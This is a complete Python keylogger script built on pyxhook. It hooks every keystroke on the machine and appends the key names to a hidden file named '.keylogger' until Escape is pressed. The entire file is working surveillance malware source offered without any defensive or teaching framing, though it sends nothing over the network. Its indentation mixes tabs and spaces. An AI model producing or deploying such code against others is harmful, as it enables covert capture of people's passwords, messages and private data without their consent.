import pyxhook
import time

# functions to write a newline character into the file
def newline():
	file = open('.keylogger', 'a')
	file.write('\n')
	file.close()

# This function is called every time a key is pressed
def key_press_event(event):
    global running
    # write the key pressed into a file
    if event.Key != 'space' and event.Key != 'Escape':
	    with open('.keylogger', 'a+') as File:
	    	File.write(event.Key)

    # If the ascii value matches spacebar, add a newline in the file
    if event.Key == 'space':
        newline()

    # If the ascii value matches escape, terminate the while loop
    if event.Key == 'Escape':
        running = False
        newline()

if __name__ == '__main__':
	hookman = pyxhook.HookManager()
	hookman.KeyDown = key_press_event
	hookman.HookKeyboard()
	hookman.start()

	
	running = True
	while running:
	    time.sleep(0.1)

	
	hookman.cancel()
